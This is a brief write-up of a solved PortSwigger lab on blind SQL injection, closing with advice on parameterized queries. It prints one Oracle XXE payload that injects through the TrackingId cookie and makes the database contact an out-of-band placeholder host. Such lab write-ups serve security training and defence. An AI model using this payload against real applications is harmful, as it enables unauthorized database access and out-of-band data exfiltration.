# PortSwigger SQL Injection — Blind SQL injection with out-of-band interaction

- Platform: PortSwigger Web Security Academy
- Category: SQL injection
- Difficulty: PRACTITIONER
- Result: solved

## Technique

Oracle XXE OOB

## Key details

- Injection/object: `TrackingId`
- Table/columns/channel: `EXTRACTVALUE(xmltype(...))`
- Key result: `OAST interaction`

## Payload

```text
x' UNION SELECT EXTRACTVALUE(xmltype('<!DOCTYPE ... SYSTEM "http://oast/">'),'/l') FROM dual--
```

## Notes

This lab belongs to the advanced half of PortSwigger's SQL injection track. The workflow is to identify the available oracle or output channel, extract the administrator credential if required, and log in as administrator to trigger the solved state.

## Defensive takeaway

Parameterized queries are the root fix. Error suppression, WAF filters, and metadata permission reduction are useful defense-in-depth, but they do not replace binding untrusted input as data.
